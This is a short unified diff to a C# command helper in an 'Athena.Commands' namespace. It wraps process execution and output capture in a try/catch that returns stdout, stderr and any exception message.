@@ -46,17 +46,25 @@ namespace Athena.Commands
                 RedirectStandardError = true,
                 RedirectStandardOutput = true
             };
-            process.Start();
-            process.WaitForExit();
-            if (process.ExitCode != 0)
+            try
             {
-                output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd();
+                process.Start();
+                process.WaitForExit();
+                if (process.ExitCode != 0)
+                {
+                    output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd();
+                }
+                else
+                {
+                    output = process.StandardOutput.ReadToEnd();
+                }
+                return output;
             }
-            else
+            catch (Exception e)
             {
-                output = process.StandardOutput.ReadToEnd();
+                output = process.StandardOutput.ReadToEnd() + Environment.NewLine + process.StandardError.ReadToEnd() + Environment.NewLine + e.Message;
+                return output;
             }
-            return output;
         }
     }
 }
